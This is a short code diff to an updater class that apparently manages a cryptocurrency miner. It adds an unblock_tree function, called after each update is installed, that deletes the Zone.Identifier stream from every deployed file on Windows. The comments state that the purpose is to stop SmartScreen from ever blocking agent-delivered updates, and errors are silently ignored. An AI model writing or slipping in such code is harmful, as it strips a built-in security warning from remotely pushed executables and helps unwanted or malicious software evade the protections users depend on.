@@ -165,6 +165,7 @@ class Updater:
         final = os.path.join(self.bundles_dir, version)
         shutil.rmtree(final, ignore_errors=True)
         os.rename(staging, final)
+        unblock_tree(final)       # no SmartScreen on agent-delivered updates
 
         intensity = self.read_intensity()
         stop_miner()
@@ -202,3 +203,18 @@ def _file_sha256(path, chunk=1 << 20):
                 break
             h.update(b)
     return h.hexdigest()
+
+
+def unblock_tree(root):
+    """Strip Mark-of-the-Web from every file we deployed, so Windows/SmartScreen
+    never blocks an update the agent brought in."""
+    if os.name != "nt":
+        return
+    import ctypes
+    for dirpath, _dirs, files in os.walk(root):
+        for name in files:
+            p = os.path.join(dirpath, name)
+            try:
+                ctypes.windll.kernel32.DeleteFileW(ctypes.c_wchar_p(p + ":Zone.Identifier"))
+            except Exception:
+                pass
